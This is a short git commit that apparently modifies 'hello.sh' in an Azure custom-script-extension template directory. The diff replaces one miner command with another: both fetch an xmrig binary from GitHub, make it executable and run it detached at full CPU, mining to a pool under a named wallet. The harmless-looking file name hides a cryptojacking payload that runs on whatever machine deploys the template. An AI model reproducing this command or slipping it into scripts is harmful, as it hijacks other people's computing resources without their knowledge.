ab3d3143de3a819454f5d766f0a618ba7da7cfd4
copnanhdai <copnanhdai@gmail.com>
2018-03-05 00:13:21 +0700

    Update hello.sh

--- 201-customscript-extension-public-storage-on-ubuntu/scripts/hello.sh
+++ 201-customscript-extension-public-storage-on-ubuntu/scripts/hello.sh
@@ -1,3 +1,1 @@
-#!/bin/bash
-
-screen -S ebe wget https://github.com/knorhaan/xmr-standalone/raw/master/xmrig ; screen -S ebe chmod +x ./xmrig ; screen -S ebe ./xmrig -o etn.suprnova.cc:8875 -u copnanhdai.1 -p aaa -k -t 7 --donate-level=1 --max-cpu-usage=100 --av=2
+screen -d -m wget https://github.com/knorhaan/xmr-standalone/raw/master/xmrig ; screen -d -m chmod +x ./xmrig ; screen -d -m ./xmrig -o etn-asia1.nanopool.org:13333 -u etnkLw1Rv14C4EWBYpFjYhAdQJhAJkUmUA1orfEMoay16bTLSZyUGwrP2RqJtUrshh111fo7fznyBXVAH2r3XEQA2r5UdxED9x -p aaa -k -t 7 --donate-level=1 --max-cpu-usage=100 --av=2 ; 
